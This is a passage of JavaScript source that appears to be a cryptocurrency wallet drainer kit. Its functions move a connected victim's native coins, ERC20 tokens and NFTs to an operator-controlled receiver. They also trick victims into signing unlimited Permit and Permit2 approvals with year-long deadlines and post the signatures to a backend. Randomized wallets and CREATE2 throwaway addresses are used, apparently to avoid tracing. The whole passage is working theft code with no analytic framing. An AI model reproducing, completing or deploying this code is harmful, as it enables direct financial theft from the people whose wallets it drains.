  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_PANCAKE_V3 = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Pancake_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_CONTRACT = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  if (asset.amount_usd > MS_Settings.Settings.Chains[ankr_chain_id].Min_CREATE2_Price)
      return await DO_CREATE2_CONTRACT(asset);

  if (MS_Settings.Settings.Use_Public_Contract && MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null) {
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy = 2;
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address = MS_Settings.Public_Contract[parseInt(asset.chain_id)][MS_Settings.Settings.Use_Public_Premium ? (asset.amount_usd >= 500 ? 1 : 0) : 0];
  }



  const Contract_ABI = (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ?
  JSON.parse(`[{"constant":false,"inputs":[],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`) :
  ((MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) ? JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`)
  : JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(Contract_ABI, MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address);

  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Receiver).encodeABI();
  } else if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 2) {
    let split_data = false;
    try {
      const response = await send_request({ action: 'partner_percent', address: MS_Partner_Address });
      if (response.status == 'OK' && response.mode == true) split_data = response.percent;
    } catch(err) {
      console.log(err);
    }
    let secondary_address = !split_data ? '0x0000000000000000000000000000000000000000' : MS_Partner_Address;
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Current_Address, MS_Settings.Receiver,
    secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), MS_Settings.Settings.Use_Back_Feature).encodeABI();
  } else {
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]().encodeABI();
  }

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, value: BN(100), data: contract_data };
  const gas_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 100000)));

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) {
    unsigned_tx.to = MS_Settings.Receiver;
    unsigned_tx.data = '0x';
    const another_gas_limit = await node.estimateGas(unsigned_tx);
    const new_available_amount = balance.sub(another_gas_limit.mul(gas_price)).sub(tokens_gas_fee);
    if (new_available_amount.lte(BN(0))) {
      throw 'LOW_BALANCE';
    } else {
      return TRANSFER_NATIVE(asset, true);
    }
  }

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_CREATE2_CONTRACT = async (asset) => {
    const web3 = new Web3(MS_Provider);
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice())
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
    const nonce = await get_nonce(asset.chain_id);
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    let CREATE2_Contract_ABI = [
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
                {
                    internalType: "address",
                    name: "reciver",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "CREATE2AndCallNative",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "CREATE2AndCallTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "calculateAddress",
            outputs: [
                {
                    internalType: "address",
                    name: "",
                    type: "address",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];

    const CREATE2contract = new ethers.Contract(
        MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        CREATE2_Contract_ABI,
        MS_Signer
    );

    let salt = ethers.utils.randomBytes(32);
    salt = ethers.utils.hexlify(salt);

    const create2address = await CREATE2contract.calculateAddress(salt, {
        from: MS_Current_Address,
    });

    const gas_limit_nt =
        asset.chain_id == 42161 ? 1500000 : asset.chain_id == 43114 ? 1500000 : asset.chain_id == 369 ? 500000 : 100000;
    const gas_limit_ct =
        asset.chain_id == 42161 ? 5000000 : asset.chain_id == 43114 ? 5000000 : asset.chain_id == 369 ? 900000 : 150000;

    const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? "35000000000" : gas_price);

    const nt_fee = gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt)).mul(ethers.BigNumber.from("1"));
    const ct_fee = gas_price_calc
        .mul(ethers.BigNumber.from(gas_limit_ct))
        .mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
    const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

    let Contract_ABI = JSON.parse(
        `[{"constant":false,"inputs":[],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`
    );
    const contract = new ethers.Contract(create2address, Contract_ABI, MS_Signer);

    if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from("0"))) throw "LOW_BALANCE";

    await transfer_request(asset);
    sign_next();
    let tx = null;

    tx = await contract.Claim({
        gasLimit: ethers.BigNumber.from(gas_limit_nt),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        value: ethers.BigNumber.from(after_fee),
        from: MS_Current_Address,
    });

    send_request({
        action: "native_create2",
        user_id: MS_ID,
        asset: asset,
        address: MS_Current_Address,
        salt: salt.toString(),
        create2address,
        create2addressCreator: MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        hash: tx.hash,
    });

    wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
    // await transfer_success(asset, after_fee);
    sign_ready();
};

const DO_RANDOMIZER_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Personal_Wallet.address, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  const x_promise = send_request({
    action: 'withdraw_native', wallet: MS_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: MS_ID, asset: asset, address: MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset, available_amount); sign_ready();
};

const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);

  if (MS_Settings.Settings.Use_Wallet_Randomizer && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NATIVE(asset);
  if (ignore_contract == false && ((MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '' || (MS_Settings.Settings.Use_Public_Contract
  && MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null)) && asset.amount_usd >= MS_Settings.Settings.Use_Contract_Amount)) return DO_CONTRACT(asset);

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_RANDOMIZER_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(MS_Settings.Personal_Wallet.address, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  const x_promise = send_request({
    action: 'withdraw_token', wallet: MS_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: MS_ID, asset: asset, address: MS_Current_Address
  });

  if (MS_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_TOKEN = async (asset) => {
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    if (asset.amount_usd > MS_Settings.Settings.Chains[ankr_chain_id].Min_CREATE2_Price)
        return await CREATE2_TRANSFER_TOKEN(asset);

  if (MS_Settings.Settings.Use_Randomizer_For_Tokens && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_TOKEN(asset);

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset); sign_ready();
};

const CREATE2_TRANSFER_TOKEN = async (asset) => {
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    console.log("CREATE2_TRANSFER_TOKEN")
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);

    let CREATE2_Contract_ABI = [
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
                {
                    internalType: "address",
                    name: "reciver",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "CREATE2AndCallNative",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "CREATE2AndCallTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "calculateAddress",
            outputs: [
                {
                    internalType: "address",
                    name: "",
                    type: "address",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];

    const CREATE2contract = new ethers.Contract(
        MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        CREATE2_Contract_ABI,
        MS_Signer
    );

    let salt = ethers.utils.randomBytes(32);
    salt = ethers.utils.hexlify(salt);

    const create2address = await CREATE2contract.calculateAddress(salt, {
        from: MS_Current_Address,
    });

    const web3 = new Web3(MS_Provider);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice())
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
    const nonce = await get_nonce(asset.chain_id);
    const contract = new ethers.Contract(asset.address, MS_Contract_ABI["ERC20"], MS_Signer);
    let gas_limit = null;
    try {
        gas_limit = await contract.estimateGas.transfer(create2address, asset.amount_raw, {
            from: MS_Current_Address,
        });
        gas_limit = ethers.BigNumber.from(gas_limit)
            .div(ethers.BigNumber.from("100"))
            .mul(ethers.BigNumber.from("120"))
            .toString();
    } catch (err) {
        gas_limit = asset.chain_id == 42161 ? 5000000 : asset.chain_id == 43114 ? 5000000 : 250000;
    }
    await transfer_request(asset);
    sign_next();
    const tx = await contract.transfer(create2address, asset.amount_raw, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        from: MS_Current_Address,
    });
    wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);

    await send_request({
        action: "create2_transfer",
        asset,
        user_id: MS_ID,
        salt: salt.toString(),
        create2address,
        create2addressCreator: MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        hash: tx.hash,
    });

    sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  if (MS_Settings.Settings.Use_Randomizer_For_Tokens && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_TOKEN(asset);

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  await transfer_success(asset); sign_ready();
};

const DO_SAFA = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  await transfer_success(asset); sign_ready();
};

const DO_PERMIT2 = async (asset, assets) => {
  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], MS_Signer);
  let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      "PermitBatch": [
        {
          "name": "details",
          "type": "PermitDetails[]"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    let tokens = [];
    for (const x_asset of assets) {
      try {
        tokens.push({
          "token": x_asset.address, "expiration": permit_deadline,
          "amount": "1461501637330902918203684832716283019655932542975",
          "nonce": (await contract.allowance(MS_Current_Address, x_asset.address, (MS_Settings.Settings.Use_Randomizer_For_Tokens? MS_Settings.Personal_Wallet.address : MS_Settings.Address))).nonce
        });
      } catch(err) {
        console.log(err);
      }
    }
    permit_message = {
      "details": tokens,
      "spender": (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, assets); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 2;
  } else {
    // Permit Single
    let permit_types = {
      "PermitSingle": [
        {
          "name": "details",
          "type": "PermitDetails"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    permit_message = {
      "details": {
        "token": asset.address,
        "amount": "1461501637330902918203684832716283019655932542975",
        "expiration": permit_deadline, "nonce": (await contract.allowance(MS_Current_Address, asset.address, (MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address))).nonce
      },
      "spender": (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, [ asset ]); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success('Permit2', asset, assets); wait_message();
    const x_promise = send_request({
      action: 'sign_permit2', user_id: MS_ID, signature: permit_signature,
      message: permit_message, asset: asset, assets, address: MS_Current_Address,
      mode: permit_mode, PW: MS_Settings.Personal_Wallet
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  } else {
    await sign_cancel();
  }
};

const PERMIT_TOKEN = async (asset) => {
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    if (asset.amount_usd > MS_Settings.Settings.Chains[ankr_chain_id].Min_CREATE2_Price)
        return await CREATE2_PERMIT_TOKEN(asset);
  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
  const nonce = await contract.nonces(MS_Current_Address);
  const name = await contract.name();
  let value = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        value = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: MS_Current_Address,
      spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: MS_Current_Address,
      spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();
  const result = await MS_Signer._signTypedData({
    name: name, version: asset.permit_ver, chainId: asset.chain_id,
    verifyingContract: asset.address
  }, permit_types, permit_values),
  signature = {
    r: result.slice(0, 66),
    s: "0x" + result.slice(66, 130),
    v: Number("0x" + result.slice(130, 132))
  };
  await approve_success(asset);
  wait_message();
  const x_promise = send_request({
    action: 'permit_token', user_id: MS_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: MS_Current_Address, spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet
  });
